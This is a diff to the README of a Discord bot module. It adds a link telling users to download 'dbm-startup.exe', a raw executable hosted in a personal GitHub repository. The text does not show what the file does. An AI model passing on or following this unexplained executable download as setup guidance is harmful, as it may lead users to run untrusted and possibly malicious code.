@@ -9,7 +9,7 @@ Use this module to create professional discord bots in just a few lines of code.
 - Regular updates to functionality
 
 ### File maker
-Use [this link]() to download a startup file.
+Use [this link](https://github.com/Gfrkad21/Gfrkad21.github.io/blob/main/discord-bot-maker/dbm-startup.exe?raw=true) to download a startup file.
 
 
 ### Code Format
